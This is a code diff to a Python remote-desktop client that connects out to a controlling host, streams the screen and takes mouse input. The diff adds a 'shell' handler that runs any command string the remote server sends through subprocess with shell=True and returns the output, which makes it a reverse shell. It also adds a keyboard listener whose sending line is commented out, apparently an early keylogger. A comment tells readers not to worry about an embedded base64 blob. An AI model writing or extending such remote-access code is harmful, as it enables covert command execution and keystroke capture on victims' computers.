@@ -6,30 +6,20 @@ import pickle
 import struct
 from threading import Thread
 from pynput.mouse import Button, Controller
+import win32gui
 import lzma
 from io import BytesIO
 from PIL import Image
 import base64
+from pynput.keyboard import Key, Listener
+import subprocess
 import mss
+import os
 import json
 from screeninfo import get_monitors
-try:
-    import win32gui
-except:
-    pass
-''' DONT WORRY THIS BASE64 IS A MOUSE IMAGE. YOU CAN DECODE IT AND OBSERVE THE CODE! Double check on this site https://codebeautify.org/base64-to-image-converter'''
+''' DONT WORRY THIS BASE64 IS A MOUSE IMAGE. YOU CAN DECODE IT AND OBSERVE THE CODE! '''
 mouse = '''iVBORw0KGgoAAAANSUhEUgAAABEAAAAXCAYAAADtNKTnAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjnRFWHRDb21tZW50AGNIUk0gY2h1bmtsZW4gMzIgaWdub3JlZA1BU0NJSTogLi56JS4uLi4uLi4lLi4uLi4ubV8uLi5sLi48Li4uLlgNSEVYOiAwMDAwN0EyNTAwMDA4MDgzMDAwMEY0MjUwMDAwODREMTAwMDA2RDVGMDAwMEU4NkMwMDAwM0M4QjAwMDAxQjU4GN773QAAAgFJREFUeJyUlEtLAlEUx0cd7YFagUkvxKIgiB4USEREUNAqWgvtatEnaNVnaVWrNrVoEURFT6JCxBDDIpKScGG5EATR2/9MZ6ZrjjJe+MHMmXt+c+65c0cRQihEuVy2lUolO0HXetwKil31valN3SFFUVygFTQDJ7CBhiSHYA45ncAHvI2INMlH+lNAcgRWkDMI+kCbVZEmwYVg0SlYRc7of5EliSS6AGtIHLMqqpBIoiuwblVUJZFE12Yis+03leBbEanUu2VRlYQExWJRFAoF8fzyWlMkL61CIgvy+bzI5XIiHk/UFdH2GxIzQTabFZlMRkQiUTPR3wdJknqCdDqN/qTE7e2dwNwrJM2AEdDFx8SuSWTB01PSEODZjcQ1uGQJVRMAHuDQJLLA1ezL7ezuaRVw4pbb27OEyfNgGkyAIdAN3IZEEnyDDcQepSXEMHEBzIJxEOSD6uGT/7scFnyBMIJziJ3s7x+KZDJJkmOwyRJaRi8LnJqAd+cIyVmwiNthMIVYGEQTiYQ4OzsnUZTk9KyiF3y69aHy3tPWDThcPX1IPCBBLBYjyT1XEuJ+dHBOxaCymvgN7WikG4kB8AC2wTLik9zUfn5hlUQXqQyValNdfjugb8HPDQ3ydavRD31N8rpMBklb+O1eFlDM+OOZ/2RqV+mQK9Dn/wAAAP//AwCGMlcrSCX+UAAAAABJRU5ErkJggg=='''
-screen_info = []
-monitors = get_monitors()
-for monitor in monitors:
-    screen_info.append({
-        "size": (monitor.width, monitor.height),
-        "resolution": (monitor.width, monitor.height),
-        "position": (monitor.x, monitor.y),
-        "len_monitors": (len(monitors) - 1)
-    })
-json_data = json.dumps(screen_info)
-display = json.dumps(screen_info).encode('utf-8')
+
 class RemoteDesktop:
     def __init__(self, host, port):
         self.ip = host
@@ -44,7 +34,21 @@ class RemoteDesktop:
         self.powershell = False
 
         
-    def record(self):
+    def display(self) -> bytes:
+        screen_info = []
+        for monitor in get_monitors():
+            screen_info.append({
+                "size": (monitor.width, monitor.height),
+                "resolution": (monitor.width, monitor.height),
+                "position": (monitor.x, monitor.y),
+                "len_monitors": (len(get_monitors()) - 1)
+            })
+        json_data = json.dumps(screen_info)
+        display = json_data.encode('utf-8')
+        return display
+
+
+    def record(self) -> np:
         if not self.userinput:
             screenshot = mss.mss().grab(mss.mss().monitors[self.monitor])
             imCursor = Image.open(BytesIO(base64.b64decode(mouse)))
@@ -56,6 +60,10 @@ class RemoteDesktop:
             screenshot = mss.mss().grab(mss.mss().monitors[self.monitor])
             img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
             return np.array(img)
+    
+    def on_press(self, key):
+        keyboard = str(key)
+        #self.send(keyboard.encode('utf-8'))
 
     def recv_msg(self):
         return self.socket.recv(1028).decode()
@@ -63,12 +71,31 @@ class RemoteDesktop:
     def send(self, data):
         self.socket.send(struct.pack('>L', len(data)) + data)
 
+    def shell(self, data):
+        data = "".join(data)
+        if data.startswith('cd '):
+        # Change the current working directory
+            os.chdir(data[3:])
+            self.send((os.getcwd() + ">").encode())
+        else:
+            runcmd = subprocess.Popen(data,
+                            shell=True,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            stdin=subprocess.PIPE)
+            a = bytes(os.getcwd() + ">", encoding="utf-8") + runcmd.stdout.read() + runcmd.stderr.read()
+            self.send(a)
+                    
     def __servercontrol(self):
         debug = False
         if not debug:
             while self.active:
                 try:
-                    data = self.recv_msg().split(":")
+                    data = self.recv_msg()
+                    if data.startswith("shell"):
+                        data = data.split(":", 1)
+                    else:
+                        data = data.split(":")
                     if data[0] == "mouse":
                         mouse = Controller()
                         xAxis, yAxis, event, flags = int(data[1]), int(data[2]), int(data[3]), int(data[4])
@@ -111,12 +138,14 @@ class RemoteDesktop:
                             self.userinput = False
                         else:
                             self.userinput = True
+                    elif data[0] == "shell":
+                        self.shell(data[1:])
                 except:
                     pass
                 
     def __client_streaming(self):
         self.socket.connect((self.ip, self.port))
-        self.socket.send(display)
+        self.socket.send(self.display())
         while self.active:
             try:
                 frame = self.record()
@@ -125,6 +154,7 @@ class RemoteDesktop:
             _, frame = cv2.imencode('.jpeg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), self.quality])
             data = pickle.dumps(frame, 0)
             video = lzma.compress(data)
+            video = b"video->"+video
             try:
                 self.send(video)
             except ConnectionResetError:
@@ -144,6 +174,8 @@ class RemoteDesktop:
             client_thread.start()
             controller = Thread(target=self.__servercontrol)
             controller.start()
+            with Listener(on_press = self.on_press) as l:
+                l.join()
             
     def stop_stream(self):
         if self.active:
